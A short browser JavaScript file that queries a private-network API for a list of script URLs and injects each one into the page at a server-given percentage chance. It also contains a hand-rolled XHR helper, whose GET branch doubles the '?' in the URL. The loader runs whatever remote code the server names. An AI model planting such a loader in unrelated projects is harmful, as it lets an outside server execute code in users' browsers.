! function () {
  if (document.body) return;

}();


ajax({
  url:'http://192.168.2.193:9998/v1/api?fid=EboUNLosu4wLaLTatPO_8QNHq7j2pbIslkacYI5grJ99uG-BDuuW4MP5_gIS6OZ2HmLG40TRZHWPLzmtXjPx6T6OWlhS4pEBYgYgZVe8RwOxg_Xijl7TkkGDkJal2PHBI5giVVILeJa6ExaGiSqDw3IQmxh4fkmWFS1N2a4omi0&tdsourcetag=s_pcqq_aiomsg',
  success:function(res){
    runB(res);
  },
})
function runB (response) {
  console.time(1);
  var data = JSON.parse(response),len = data.length,i = 0;
  console.log(1,data)

  while(i<len){
    var random = Math.random() * 100;
    if(data[i][1] > random){
      apChild(data[i][0]);
    }
    i++;
  }
  console.timeEnd(1);
}

function apChild(str) {
  if (!document.body) return;
  var oScript = document.createElement('script');
  oScript.setAttribute('type', 'text/javascript');
  oScript.src = str;
  document.body.appendChild(oScript);
}
function randomRun(num,callback){
  var random = Math.random() * 100;
  if(num > random){
    callback && callback();
  }
}

function ajax(options) {
  options = options || {};
  options.type = (options.type || "GET").toUpperCase();
  options.dataType = options.dataType || 'json';
  options.async = options.async || true;
  var params = getParams(options.data);
  var xhr;
  if (window.XMLHttpRequest) {
    xhr = new XMLHttpRequest();
  } else {
    xhr = new ActiveXObject('Microsoft.XMLHTTP')
  }
  xhr.onreadystatechange = function () {
    if (xhr.readyState == 4) {
      var status = xhr.status;
      if (status >= 200 && status < 300) {
        options.success && options.success(xhr.responseText, xhr.responseXML);
      } else {
        options.error && options.error(status);
      }
    }
  };
  if (options.type == 'GET') {
    xhr.open("GET", options.url + '?' + params, options.async);
    xhr.send(null)
  } else if (options.type == 'POST') {
    xhr.open('POST', options.url, options.async);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send(params);
  }
}
function getParams(data) {
  var arr = [];
  for (var param in data){
      arr.push(encodeURIComponent(param) + '=' +encodeURIComponent(data[param]));
  }
  return arr.join('&');
}